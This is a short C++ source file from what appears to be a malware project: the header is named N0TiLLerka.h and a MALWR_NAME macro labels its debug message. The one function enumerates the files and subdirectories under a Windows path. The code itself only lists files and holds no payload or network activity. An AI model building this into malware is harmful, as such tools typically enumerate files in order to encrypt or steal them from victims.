#include "../../../HeaderFiles/N0TiLLerka.h"

BOOL fnDirectoryIteratorW(std::wstring szDir, std::wstring szMask, std::vector<std::wstring>& vszDir, std::vector<std::wstring>& vszFile) {
	WIN32_FIND_DATA w32Fd;
	std::wstring szW32Fd = szDir + L"\\" + szMask;

	HANDLE hFind = FindFirstFile(szW32Fd.c_str(), &w32Fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
					vszDir.push_back(szDir + L"\\" + w32Fd.cFileName);
				}
			} else {
				vszFile.push_back(szDir + L"\\" + w32Fd.cFileName);
			}
		} while (FindNextFile(hFind, &w32Fd));

		FindClose(hFind);
		return TRUE;
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Handle to FindFirstFile is invalid", MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
		return FALSE;
	}
}